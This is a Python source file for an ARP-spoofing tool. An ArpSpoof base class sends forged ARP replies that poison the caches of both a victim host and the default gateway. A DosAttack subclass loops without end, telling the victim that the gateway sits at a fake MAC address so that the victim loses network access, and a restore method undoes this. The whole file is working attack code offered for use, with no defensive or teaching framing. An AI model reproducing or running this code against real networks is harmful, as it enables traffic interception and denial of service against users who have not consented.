import time
from utils import (get_our_mac_addr, get_default_gateway_ip, get_mac_addr,
    send_arp_packet, generate_fake_mac, is_mac_in_lan)

ARP_REPLY_OPCODE = 2
TIME_BETWEEN_SEND_ARP = 10
TIME_BETWEEN_MAC_SCAN = 60
SAFE_RESTORE_SEND_ARP_COUNT = 5

class ArpSpoof:
    def __init__(self, victim_ip: str):
        self._our_mac = get_our_mac_addr()  # Get our MAC
        self._victim_ip = victim_ip
        self._victim_mac = get_mac_addr(self._victim_ip)  # Get MAC of victim
        self._default_gateway_ip = get_default_gateway_ip()  # Get IP of default gateway
        self._default_gateway_mac = get_mac_addr(self._default_gateway_ip)  # Get MAC of default gateway

    """
    This function misleading the victims by ARP-Spoofing
    Input: self.
    Output: None
    """
    def __spoof(self) -> None:
        # Make the default gateway think that I'm the victim
        send_arp_packet(ARP_REPLY_OPCODE, self._our_mac, self._victim_ip, self._default_gateway_mac, self._default_gateway_ip)
        # Make the victim think that I'm the default gateway
        send_arp_packet(ARP_REPLY_OPCODE, self._our_mac, self._default_gateway_ip, self._victim_mac, self._victim_ip)

    def attack(self) -> None:
        raise NotImplementedError("attack() must be implemented by subclass")
    def restore(self) -> None:
        raise NotImplementedError("restore() must be implemented by subclass")

class DosAttack(ArpSpoof):
    def __init__(self, victim_ip: str):
        super().__init__(victim_ip)

    """
    This function do a DoS attack
    Input: self
    Output: None
    """
    def attack(self) -> None:
        last_arp: float = 0.0  # The last time we sent an ARP packet to the victim
        last_mac_check: float = 0.0  # The last time we check if the MAC address is good for DoS
        mac_for_dos: str = generate_fake_mac()

        while True:
            now = time.time()
            if now - last_mac_check >= TIME_BETWEEN_MAC_SCAN:  # If we need to check if the MAC for DoS is fake(good for DoS, every 1 min)
                if is_mac_in_lan(mac_for_dos):  # If the MAC for DoS is now real, replace to fake
                    mac_for_dos = generate_fake_mac()
                last_mac_check = now
            if now - last_arp >= TIME_BETWEEN_SEND_ARP:  # If we need to mislead the victim again(Every 10 sec)
                # Misleading victim to think that the MAC of default gateway is a wrong MAC(DoS)
                send_arp_packet(ARP_REPLY_OPCODE, mac_for_dos, self._default_gateway_ip, self._victim_mac, self._victim_ip)
                last_arp = now
            time.sleep(TIME_BETWEEN_SEND_ARP)

    """
    This function safely restore the state to the state before the DoS attack
    Input: self
    Output: None 
    """
    def restore(self) -> None:
        # Send 5 times to make sure packets will not get lost(safely restore)
        send_arp_packet(ARP_REPLY_OPCODE, self._default_gateway_mac, self._default_gateway_ip, self._victim_mac, self._victim_ip, SAFE_RESTORE_SEND_ARP_COUNT)